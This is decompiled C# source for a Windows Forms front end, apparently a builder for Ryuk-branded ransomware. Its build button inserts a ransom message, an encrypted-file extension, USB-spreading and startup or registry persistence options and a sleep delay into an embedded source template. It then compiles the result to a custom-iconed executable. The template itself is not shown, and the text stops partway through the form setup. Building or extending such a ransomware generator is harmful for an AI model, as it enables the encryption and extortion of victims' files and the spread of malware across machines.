using System;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Ryuk.Net.Properties;

namespace CustomWindowsForm;

public class BlackForm : Form
{
	private bool isTopPanelDragged = false;

	private bool isLeftPanelDragged = false;

	private bool isRightPanelDragged = false;

	private bool isBottomPanelDragged = false;

	private bool isTopBorderPanelDragged = false;

	private bool isRightBottomPanelDragged = false;

	private bool isLeftBottomPanelDragged = false;

	private bool isRightTopPanelDragged = false;

	private bool isLeftTopPanelDragged = false;

	private bool isWindowMaximized = false;

	private Point offset;

	private Size _normalWindowSize;

	private Point _normalWindowLocation = Point.Empty;

	private string iconLocation = "";

	private IContainer components = null;

	private Panel TopBorderPanel;

	private Panel RightPanel;

	private Panel LeftPanel;

	private Panel BottomPanel;

	private Panel TopPanel;

	private ButtonZ _CloseButton;

	private Panel RightBottomPanel_1;

	private Label WindowTextLabel;

	private MinMaxButton _MaxButton;

	private Panel panel2;

	private ButtonZ _MinButton;

	private Panel RightBottomPanel_2;

	private Panel LeftBottomPanel_1;

	private Panel LeftBottomPanel_2;

	private Panel RightTopPanel_1;

	private Panel RightTopPanel_2;

	private Panel LeftTopPanel_1;

	private Panel LeftTopPanel_2;

	private ShapedButton shapedButton4;

	private CheckBox usbSpreadCheckBox;

	private TextBox textBox1;

	private ShapedButton shapedButton3;

	private SaveFileDialog saveFileDialog1;

	private CheckBox checkBox1;

	private TextBox textBox2;

	private TextBox spreadNameText;

	private CheckBox checkBox2;

	private TextBox textBox4;

	private CheckBox registryStartupcheckBox;

	private CheckBox startupcheckBox3;

	private OpenFileDialog openFileDialog1;

	private PictureBox pictureBox1;

	private Label selectIconLabel;

	private CheckBox sleepCheckBox;

	private TextBox SleepTextBox;

	public BlackForm()
	{
		InitializeComponent();
	}

	private void BlackForm_Load(object sender, EventArgs e)
	{
	}

	private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isTopBorderPanelDragged = true;
		}
		else
		{
			isTopBorderPanelDragged = false;
		}
	}

	private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.get_Y() < ((Form)this).get_Location().Y && isTopBorderPanelDragged)
		{
			if (((Control)this).get_Height() < 50)
			{
				((Control)this).set_Height(50);
				isTopBorderPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y + e.get_Y()));
				((Control)this).set_Height(((Control)this).get_Height() - e.get_Y());
			}
		}
	}

	private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopBorderPanelDragged = false;
	}

	private void TopPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isTopPanelDragged = true;
			Point point = ((Control)this).PointToScreen(new Point(e.get_X(), e.get_Y()));
			offset = default(Point);
			offset.X = ((Form)this).get_Location().X - point.X;
			offset.Y = ((Form)this).get_Location().Y - point.Y;
		}
		else
		{
			isTopPanelDragged = false;
		}
		if (e.get_Clicks() == 2)
		{
			isTopPanelDragged = false;
			_MaxButton_Click(sender, (EventArgs)(object)e);
		}
	}

	private void TopPanel_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Invalid comparison between Unknown and I4
		if (isTopPanelDragged)
		{
			Point location = ((Control)TopPanel).PointToScreen(new Point(e.get_X(), e.get_Y()));
			location.Offset(offset);
			((Form)this).set_Location(location);
			if ((((Form)this).get_Location().X > 2 || ((Form)this).get_Location().Y > 2) && (int)((Form)this).get_WindowState() == 2)
			{
				((Form)this).set_Location(_normalWindowLocation);
				((Form)this).set_Size(_normalWindowSize);
				_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				isWindowMaximized = false;
			}
		}
	}

	private void TopPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopPanelDragged = false;
		if (((Form)this).get_Location().Y <= 5 && !isWindowMaximized)
		{
			_normalWindowSize = ((Form)this).get_Size();
			_normalWindowLocation = ((Form)this).get_Location();
			Rectangle workingArea = Screen.get_PrimaryScreen().get_WorkingArea();
			((Form)this).set_Location(new Point(0, 0));
			((Form)this).set_Size(new Size(workingArea.Width, workingArea.Height));
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Invalid comparison between Unknown and I4
		if (((Form)this).get_Location().X <= 0 || e.get_X() < 0)
		{
			isLeftPanelDragged = false;
			((Form)this).set_Location(new Point(10, ((Form)this).get_Location().Y));
		}
		else if ((int)e.get_Button() == 1048576)
		{
			isLeftPanelDragged = true;
		}
		else
		{
			isLeftPanelDragged = false;
		}
	}

	private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.get_X() < ((Form)this).get_Location().X && isLeftPanelDragged)
		{
			if (((Control)this).get_Width() < 100)
			{
				((Control)this).set_Width(100);
				isLeftPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + e.get_X(), ((Form)this).get_Location().Y));
				((Control)this).set_Width(((Control)this).get_Width() - e.get_X());
			}
		}
	}

	private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftPanelDragged = false;
	}

	private void RightPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isRightPanelDragged = true;
		}
		else
		{
			isRightPanelDragged = false;
		}
	}

	private void RightPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightPanelDragged)
		{
			if (((Control)this).get_Width() < 100)
			{
				((Control)this).set_Width(100);
				isRightPanelDragged = false;
			}
			else
			{
				((Control)this).set_Width(((Control)this).get_Width() + e.get_X());
			}
		}
	}

	private void RightPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isRightPanelDragged = false;
	}

	private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isBottomPanelDragged = true;
		}
		else
		{
			isBottomPanelDragged = false;
		}
	}

	private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isBottomPanelDragged)
		{
			if (((Control)this).get_Height() < 50)
			{
				((Control)this).set_Height(50);
				isBottomPanelDragged = false;
			}
			else
			{
				((Control)this).set_Height(((Control)this).get_Height() + e.get_Y());
			}
		}
	}

	private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isBottomPanelDragged = false;
	}

	private void _MinButton_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void _MaxButton_Click(object sender, EventArgs e)
	{
		if (isWindowMaximized)
		{
			((Form)this).set_Location(_normalWindowLocation);
			((Form)this).set_Size(_normalWindowSize);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
			isWindowMaximized = false;
		}
		else
		{
			_normalWindowSize = ((Form)this).get_Size();
			_normalWindowLocation = ((Form)this).get_Location();
			Rectangle workingArea = Screen.get_PrimaryScreen().get_WorkingArea();
			((Form)this).set_Location(new Point(0, 0));
			((Form)this).set_Size(new Size(workingArea.Width, workingArea.Height));
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void _CloseButton_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = true;
	}

	private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightBottomPanelDragged)
		{
			if (((Control)this).get_Width() < 100 || ((Control)this).get_Height() < 50)
			{
				((Control)this).set_Width(100);
				((Control)this).set_Height(50);
				isRightBottomPanelDragged = false;
			}
			else
			{
				((Control)this).set_Width(((Control)this).get_Width() + e.get_X());
				((Control)this).set_Height(((Control)this).get_Height() + e.get_Y());
			}
		}
	}

	private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = false;
	}

	private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseDown(sender, e);
	}

	private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseMove(sender, e);
	}

	private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseUp(sender, e);
	}

	private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = true;
	}

	private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.get_X() < ((Form)this).get_Location().X && (isLeftBottomPanelDragged || ((Control)this).get_Height() < 50))
		{
			if (((Control)this).get_Width() < 100)
			{
				((Control)this).set_Width(100);
				((Control)this).set_Height(50);
				isLeftBottomPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + e.get_X(), ((Form)this).get_Location().Y));
				((Control)this).set_Width(((Control)this).get_Width() - e.get_X());
				((Control)this).set_Height(((Control)this).get_Height() + e.get_Y());
			}
		}
	}

	private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = false;
	}

	private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseDown(sender, e);
	}

	private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseMove(sender, e);
	}

	private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseUp(sender, e);
	}

	private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = true;
	}

	private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.get_Y() < ((Form)this).get_Location().Y || e.get_X() < ((Form)this).get_Location().X) && isRightTopPanelDragged)
		{
			if (((Control)this).get_Height() < 50 || ((Control)this).get_Width() < 100)
			{
				((Control)this).set_Height(50);
				((Control)this).set_Width(100);
				isRightTopPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y + e.get_Y()));
				((Control)this).set_Height(((Control)this).get_Height() - e.get_Y());
				((Control)this).set_Width(((Control)this).get_Width() + e.get_X());
			}
		}
	}

	private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = false;
	}

	private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseDown(sender, e);
	}

	private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseMove(sender, e);
	}

	private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseUp(sender, e);
	}

	private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = true;
	}

	private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.get_X() < ((Form)this).get_Location().X || e.get_Y() < ((Form)this).get_Location().Y) && isLeftTopPanelDragged)
		{
			if (((Control)this).get_Width() < 100 || ((Control)this).get_Height() < 50)
			{
				((Control)this).set_Width(100);
				((Control)this).set_Height(100);
				isLeftTopPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + e.get_X(), ((Form)this).get_Location().Y));
				((Control)this).set_Width(((Control)this).get_Width() - e.get_X());
				((Form)this).set_Location(new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y + e.get_Y()));
				((Control)this).set_Height(((Control)this).get_Height() - e.get_Y());
			}
		}
	}

	private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = false;
	}

	private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseDown(sender, e);
	}

	private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseMove(sender, e);
	}

	private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseUp(sender, e);
	}

	private void file_button_Click(object sender, EventArgs e)
	{
	}

	private void edit_button_Click(object sender, EventArgs e)
	{
	}

	private void view_button_Click(object sender, EventArgs e)
	{
	}

	private void run_button_Click(object sender, EventArgs e)
	{
	}

	private void help_button_Click(object sender, EventArgs e)
	{
	}

	private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
	{
		TopPanel_MouseDown(sender, e);
	}

	private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
	{
		TopPanel_MouseMove(sender, e);
	}

	private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
	{
		TopPanel_MouseUp(sender, e);
	}

	private void shapedButton3_Click(object sender, EventArgs e)
	{
		Form2 form = new Form2();
		((Control)form).Show();
	}

	private void shapedButton4_Click(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Expected O, but got Unknown
		//IL_03aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Invalid comparison between Unknown and I4
		if (((Control)textBox1).get_Text().Trim().Length < 1)
		{
			MessageBox.Show("Please type your message!", "Read_it.txt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (string.IsNullOrWhiteSpace("aa"))
		{
			MessageBox.Show("All fields are required", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((TextBoxBase)textBox1).get_Lines().Length; i++)
		{
			stringBuilder.Append("\"" + ((TextBoxBase)textBox1).get_Lines()[i] + "\",\n");
		}
		string source = Resources.Source;
		source = source.Replace("#messages", stringBuilder.ToString());
		if (checkBox1.get_Checked())
		{
			source = source.Replace("#encryptedFileExtension", "");
		}
		else
		{
			string text = ((Control)textBox2).get_Text();
			if (text.StartsWith("."))
			{
				text = text.Substring(1);
			}
			source = source.Replace("#encryptedFileExtension", text);
		}
		if (checkBox2.get_Checked())
		{
			if (((Control)textBox4).get_Text().Trim().Length < 1)
			{
				MessageBox.Show("Proccess name field is empty");
				return;
			}
			if (((Control)textBox4).get_Text().EndsWith(".exe"))
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).get_Text());
			}
			else
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).get_Text() + ".exe");
			}
		}
		else
		{
			source = source.Replace("#copyRoaming", "false");
			source = source.Replace("#exeName", ((Control)textBox4).get_Text());
		}
		if (usbSpreadCheckBox.get_Checked())
		{
			if (((Control)spreadNameText).get_Text().Trim().Length < 1)
			{
				MessageBox.Show("Usb spread name field is empty");
				return;
			}
			if (((Control)spreadNameText).get_Text().EndsWith(".exe"))
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).get_Text());
			}
			else
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).get_Text() + ".exe");
			}
		}
		else
		{
			source = source.Replace("#checkSpread", "false");
			source = source.Replace("#spreadName", ((Control)spreadNameText).get_Text());
		}
		source = ((!startupcheckBox3.get_Checked()) ? source.Replace("#startupFolder", "false") : source.Replace("#startupFolder", "true"));
		source = ((!registryStartupcheckBox.get_Checked()) ? source.Replace("#registryStartup", "false") : source.Replace("#registryStartup", "true"));
		if (sleepCheckBox.get_Checked())
		{
			source = source.Replace("#checkSleep", "true");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).get_Text());
		}
		else
		{
			source = source.Replace("#checkSleep", "false");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).get_Text());
		}
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Executable (*.exe)|*.exe");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				new Compiler(source, ((FileDialog)val).get_FileName(), iconLocation);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
	{
	}

	private void panel2_Paint(object sender, PaintEventArgs e)
	{
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox2).get_Enabled())
		{
			((Control)textBox2).set_Enabled(true);
		}
		else
		{
			((Control)textBox2).set_Enabled(false);
		}
	}

	private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)spreadNameText).get_Enabled())
		{
			((Control)spreadNameText).set_Enabled(true);
		}
		else
		{
			((Control)spreadNameText).set_Enabled(false);
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox4).get_Enabled())
		{
			((Control)textBox4).set_Enabled(true);
		}
		else
		{
			((Control)textBox4).set_Enabled(false);
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Icons (*.ico)|*.ico");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).get_FileName();
				pictureBox1.set_Image((Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).get_FileName(), new Size(60, 60)).get_Handle()));
				((Control)selectIconLabel).set_Text("");
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void selectIconLabel_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Icons (*.ico)|*.ico");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).get_FileName();
				pictureBox1.set_Image((Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).get_FileName(), new Size(60, 60)).get_Handle()));
				((Control)selectIconLabel).set_Text("");
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)SleepTextBox).get_Enabled())
		{
			((Control)SleepTextBox).set_Enabled(true);
		}
		else
		{
			((Control)SleepTextBox).set_Enabled(false);
		}
	}

	private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.get_KeyChar()) && !char.IsDigit(e.get_KeyChar()))
		{
			e.set_Handled(true);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0258: Expected O, but got Unknown
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_0309: Unknown result type (might be due to invalid IL or missing references)
		//IL_0313: Expected O, but got Unknown
		//IL_0320: Unknown result type (might be due to invalid IL or missing references)
		//IL_032a: Expected O, but got Unknown
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b2: Expected O, but got Unknown
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Expected O, but got Unknown
		//IL_03d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e0: Expected O, but got Unknown
		//IL_0463: Unknown result type (might be due to invalid IL or missing references)
		//IL_046d: Expected O, but got Unknown
		//IL_047a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0484: Expected O, but got Unknown
		//IL_0491: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Expected O, but got Unknown
		//IL_0567: Unknown result type (might be due to invalid IL or missing references)
		//IL_0571: Expected O, but got Unknown
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0588: Expected O, but got Unknown
		//IL_0595: Unknown result type (might be due to invalid IL or missing references)
		//IL_059f: Expected O, but got Unknown
		//IL_05f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fb: Expected O, but got Unknown
		//IL_0806: Unknown result type (might be due to invalid IL or missing references)
		//IL_0810: Expected O, but got Unknown
		//IL_0883: Unknown result type (might be due to invalid IL or missing references)
		//IL_088d: Expected O, but got Unknown
		//IL_089a: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a4: Expected O, but got Unknown
		//IL_08b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bb: Expected O, but got Unknown
		//IL_090d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0917: Expected O, but got Unknown
		//IL_0a6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a74: Expected O, but got Unknown
		//IL_0a81: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a8b: Expected O, but got Unknown
		//IL_0a98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa2: Expected O, but got Unknown
		//IL_0c5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c68: Expected O, but got Unknown
		//IL_0d4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d58: Expected O, but got Unknown
		//IL_0dd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0de3: Expected O, but got Unknown
		//IL_1081: Unknown result type (might be due to invalid IL or missing references)
		//IL_108b: Expected O, but got Unknown
		//IL_1153: Unknown result type (might be due to invalid IL or missing references)
		//IL_115d: Expected O, but got Unknown
		//IL_1201: Unknown result type (might be due to invalid IL or missing references)
		//IL_120b: Expected O, but got Unknown
		//IL_1366: Unknown result type (might be due to invalid IL or missing references)
		//IL_1370: Expected O, but got Unknown
		//IL_142d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1437: Expected O, but got Unknown
		//IL_1587: Unknown result type (might be due to invalid IL or missing references)
		//IL_1591: Expected O, but got Unknown
		//IL_1798: Unknown result type (might be due to invalid IL or missing references)
		//IL_17a2: Expected O, but got Unknown
		//IL_1957: Unknown result type (might be due to invalid IL or missing references)
		//IL_1961: Expected O, but got Unknown
		//IL_196e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1978: Expected O, but got Unknown
		//IL_1985: Unknown result type (might be due to invalid IL or missing references)
		//IL_198f: Expected O, but got Unknown
		//IL_1a0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a18: Expected O, but got Unknown
		//IL_1a25: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a2f: Expected O, but got Unknown
		//IL_1a3c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a46: Expected O, but got Unknown
		//IL_1ac5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1acf: Expected O, but got Unknown
		//IL_1adc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ae6: Expected O, but got Unknown
		//IL_1af3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1afd: Expected O, but got Unknown
		//IL_1b7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b87: Expected O, but got Unknown
		//IL_1b94: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b9e: Expected O, but got Unknown
		//IL_1bab: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bb5: Expected O, but got Unknown
		//IL_1c35: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c3f: Expected O, but got Unknown
		//IL_1c4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c56: Expected O, but got Unknown
		//IL_1c63: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c6d: Expected O, but got Unknown
		//IL_1cdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ce6: Expected O, but got Unknown
		//IL_1cf3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cfd: Expected O, but got Unknown
		//IL_1d0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d14: Expected O, but got Unknown
		//IL_1d83: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d8d: Expected O, but got Unknown
		//IL_1d9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da4: Expected O, but got Unknown
		//IL_1db1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dbb: Expected O, but got Unknown
		//IL_1dfd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e07: Expected O, but got Unknown
		//IL_2012: Unknown result type (might be due to invalid IL or missing references)
		//IL_201c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(BlackForm));
		TopBorderPanel = new Panel();
		RightPanel = new Panel();
		LeftPanel = new Panel();
		BottomPanel = new Panel();
		TopPanel = new Panel();
		_MinButton = new ButtonZ();
		_MaxButton = new MinMaxButton();
		WindowTextLabel = new Label();
		_CloseButton = new ButtonZ();
		RightBottomPanel_1 = new Panel();
		panel2 = new Panel();
		sleepCheckBox = new CheckBox();
		SleepTextBox = new TextBox();
		selectIconLabel = new Label();
		pictureBox1 = new PictureBox();
		registryStartupcheckBox = new CheckBox();
		startupcheckBox3 = new CheckBox();
		textBox4 = new TextBox();
		checkBox2 = new CheckBox();
		spreadNameText = new TextBox();
		checkBox1 = new CheckBox();
		textBox2 = new TextBox();
		usbSpreadCheckBox = new CheckBox();
		shapedButton4 = new ShapedButton();
